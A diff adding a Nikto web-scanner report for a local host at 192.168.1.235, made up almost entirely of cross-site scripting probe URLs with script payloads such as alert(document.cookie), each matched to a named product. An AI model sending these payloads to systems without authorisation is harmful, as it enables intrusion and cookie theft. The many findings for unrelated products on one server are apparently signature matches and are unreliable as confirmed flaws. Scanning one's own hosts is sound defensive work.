@@ -1,0 +1,235 @@
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.235
++ Target Hostname:    192.168.1.235
++ Target Port:        80
++ Start Time:         2020-04-06 20:29:46 (GMT2)
+---------------------------------------------------------------------------
++ Server: Ginatex-HTTPServer
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Root page / redirects to: http://192.168.1.235/index.asp
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-7501: /themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /index.php?option=search&searchword=<script>alert(document.cookie);</script>: Mambo Site Server 4.0 build 10 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7505: /emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7504: /emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7503: /emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /administrator/upload.php?newbanner=1&choice=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7495: /administrator/popups/sectionswindow.php?type=web&link=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7498: /administrator/gallery/view.php?path=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7499: /administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7497: /administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7496: /administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2820: /index.php?dir=<script>alert('Vulnerable')</script>: Auto Directory Index 1.2.3 and prior are vulnerable to XSS attacks.
++ /https-admserv/bin/index?/<script>alert(document.cookie)</script>: Sun ONE Web Server 6.1 administration control is vulnerable to XSS attacks.
++ OSVDB-2876: /clusterframe.jsp?cluster=<script>alert(document.cookie)</script>: Macromedia JRun 4.x JMC Interface, clusterframe.jsp file is vulnerable to a XSS attack.
++ /upload.php?type=\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-4619: /soinfo.php?\"><script>alert('Vulnerable')</script>: The PHP script soinfo.php is vulnerable to Cross Site Scripting. Set expose_php = Off in php.ini.
++ /666%0a%0a<script>alert('Vulnerable');</script>666.jsp: Apache Tomcat 4.1 / Linux is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>: NetDetector 3.0 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.
++ /servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.
++ /servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.
++ /servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>: Apache-Tomcat is vulnerable to Cross Site Scripting (XSS) by invoking java classes. http://www.cert.org/advisories/CA-2000-02.html.
++ /servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>: The NetDetector install is vulnerable to Cross Site Scripting (XSS) in its invalid login message. http://www.cert.org/advisories/CA-2000-02.html.
++ /admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>: IIS 6 on Windows 2003 is vulnerable to Cross Site Scripting (XSS) in certain error messages. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-17665: /SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>: Site Server is vulnerable to Cross Site Scripting
++ OSVDB-17666: /_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>: Site Server is vulnerable to Cross Site Scripting
++ /nosuchurl/><script>alert('Vulnerable')</script>: JEUS is vulnerable to Cross Site Scripting (XSS) when requesting non-existing JSP pages. http://securitytracker.com/alerts/2003/Jun/1007004.html
++ OSVDB-3624: /webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null: Cross site scripting (XSS) is allowed with .aspx file requests (may be Microsoft .net). http://www.cert.org/advisories/CA-2000-02.html
++ /~/<script>alert('Vulnerable')</script>.aspx: Cross site scripting (XSS) is allowed with .aspx file requests (may be Microsoft .net). http://www.cert.org/advisories/CA-2000-02.html
++ /~/<script>alert('Vulnerable')</script>.asp: Cross site scripting (XSS) is allowed with .asp file requests (may be Microsoft .net). http://www.cert.org/advisories/CA-2000-02.html
++ /user.php?op=userinfo&uname=<script>alert('hi');</script>: The PHP-Nuke installation is vulnerable to Cross Site Scripting (XSS). Update to versions above 5.3.1. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-41361: /templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>: MyMarket 1.71 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9238: /supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;: MyHelpdesk from http://myhelpdesk.sourceforge.net/ versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9238: /supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;: MyHelpdesk from http://myhelpdesk.sourceforge.net/ versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9238: /supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;: MyHelpdesk from http://myhelpdesk.sourceforge.net/ versions v20020509 and older are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>: SunShop is vulnerable to Cross Site Scripting (XSS) in the signup page. CA-200-02.
++ OSVDB-20232: /submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview: This install of PHP-Nuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-27097: /ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5049: /setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P: CiscoSecure ACS v3.0(1) Build 40 allows Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2689: /servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>: Open Market Inc. ContentServer is vulnerable to Cross Site Scripting (XSS) in the login-error page. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2322: /search.php?searchstring=<script>alert(document.cookie)</script>: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288.
++ OSVDB-50551: /search.php?searchfor=\"><script>alert(1776)</script>: Siteframe 2.2.4 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /search.asp?term=<%00script>alert('Vulnerable')</script>: ASP.Net 1.1 may allow Cross Site Scripting (XSS) in error pages (only some browsers will render this). http://www.cert.org/advisories/CA-2000-02.html.
++ /samples/search.dll?query=<script>alert(document.cookie)</script>&logic=AND: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's replymsg.php is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft+Utilities\"%3<script>alert('Vulnerable')</script>: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-4599: /pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-59093: /phptonuke.php?filnavn=<script>alert('Vulnerable')</script>: PHP-Nuke add-on PHPToNuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-32774: /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS).
++ OSVDB-32774: /phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>: Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS).
++ OSVDB-2193: /phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>: phpBB is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-4297: /phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>: phpBB is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-11145: /phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>: Phorum 3.3.2a and below from phorum.org is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-11144: /phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>: Phorum 3.3.2a and below from phorum.org is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>: Vignette server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html. Upgrade to the latest version.
++ /node/view/666\"><script>alert(document.domain)</script>: Drupal 4.2.0 RC is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5106: /netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /nav/cList.php?root=</script><script>alert('Vulnerable')/<script>: RaQ3 server script is vulnerable to Cross Site Scripting (XSS).  http://www.cert.org/advisories/CA-2000-02.html.
++ /myhome.php?action=messages&box=<script>alert('Vulnerable')</script>: OpenBB 1.0.0 RC3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>: The Sendmail Server Site User login is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>: The Sendmail Server Site Administrator Login is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>: The Sendmail Server Site Domain Administrator login is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-50539: /modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>: Basit cms 1.0 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>: The XForum (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2: The XForum (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5498: /modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>: Wiki PostNuke Module is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>: This install of PHP-Nuke's modules.php is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-20235: /modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>: The DMOZGateway (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>: Francisco Burzi PHP-Nuke 5.6, 6.0, 6.5 RC1/RC2/RC3, 6.5 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-6226: /modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-6226: /modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5914: /modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>: This install of PHP-Nuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3201: /megabook/admin.cgi?login=<script>alert('Vulnerable')</script>: Megabook guestbook is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /mailman/listinfo/<script>alert('Vulnerable')</script>: Mailman is vulnerable to Cross Site Scripting (XSS). Upgrade to version 2.0.8 to fix. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9256: /launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script>: NFuse is vulnerable to cross site scripting (XSS) in the GetLastError function. Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9257: /launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>: NFuse is vulnerable to cross site scripting (XSS) in the GetLastError function. Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-5803: /isapi/testisa.dll?check1=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-50552: /index.php?file=Liens&op=\"><script>alert('Vulnerable');</script>: Nuked-klan 1.3b is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /index.php?action=storenew&username=<script>alert('Vulnerable')</script>: SunShop is vulnerable to Cross Site Scripting (XSS) in the signup page. CA-200-02.
++ /index.php/\"><script><script>alert(document.cookie)</script><: eZ publish v3 and prior allow Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-50553: /index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>: eZ publish v3 and prior allow Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-50553: /index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search: eZ publish v3 and prior allow Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>: myphpnuke version 1.8.8_final_7 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>: myphpnuke version 1.8.8_final_7 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>: This CGI is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2322: /gallery/search.php?searchstring=<script>alert(document.cookie)</script>: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288.
++ OSVDB-20234: /friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's friend.php is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-31694: /forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>: YaBB is vulnerable to Cross Site Scripting (XSS) in the password field of the login page. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9231: /error/500error.jsp?et=1<script>alert('Vulnerable')</script>;: Macromedia Sitespring 1.2.0(277.1) on Windows 2000 is vulnerable to Cross Site Scripting (XSS) in the error pages. http://www.cert.org/advisories/CA-2000-02.html.
++ /download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's download.php is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.
++ /comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview: This version of PHP-Nuke's comments.php is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-50619: /cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>: RSA ClearTrust allows Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-651: /cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>: This CGI is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-651: /cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>: This CGI is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-7022: /calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05: DCP-Portal v5.3.1 is vulnerable to  Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-27096: /ca000007.pl?ACTION=SHOWCART&REFPAGE=\"><script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-27097: /ca000001.pl?ACTION=SHOWCART&hop=\"><script>alert('Vulnerable')</script>&PATH=acatalog%2f: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-27095: /bb000001.pl<script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /article.cfm?id=1'<script>alert(document.cookie);</script>: With malformed URLs, ColdFusion is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-4765: /apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>: Zeus 4.2r2 (webadmin-4.2r2) is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2243: /addressbook/index.php?surname=<script>alert('Vulnerable')</script>: Phpgroupware 0.9.14.003 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2243: /addressbook/index.php?name=<script>alert('Vulnerable')</script>: Phpgroupware 0.9.14.003 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>:  1.1 http://www.sugarfreenet.com/ is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /a?<script>alert('Vulnerable')</script>: Server is vulnerable to Cross Site Scripting (XSS) in the error message if code is passed in the query-string. This may be a Null HTTPd server.
++ OSVDB-54589: /a.jsp/<script>alert('Vulnerable')</script>: JServ is vulnerable to Cross Site Scripting (XSS) when a non-existent JSP file is requested. Upgrade to the latest version of JServ. http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-38019: /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /<script>alert('Vulnerable')</script>.thtml: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /<script>alert('Vulnerable')</script>.shtml: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /<script>alert('Vulnerable')</script>.jsp: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /<script>alert('Vulnerable')</script>.aspx: Cross site scripting (XSS) is allowed with .aspx file requests (may be Microsoft .net). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-6662: /<script>alert('Vulnerable')</script>: Server is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-9239: /mailman/admin/ml-name?\"><script>alert('Vulnerable')</script>;: Mailman is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-25499: /affich.php?image=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS.
++ OSVDB-25498: /diapo.php?rep=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS.
++ OSVDB-25497: /index.php?rep=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS.
++ OSVDB-700: /fcgi-bin/echo?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3954: /fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-700: /fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3954: /fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-19947: /apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>: Zeus Admin server 4.1r2 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-12606: /index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-12607: /forgot_password.php?email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-12606: /bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-12607: /bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-12606: /eventum/index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-12607: /eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-2562: /login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2562: /login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2562: /SPHERA/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
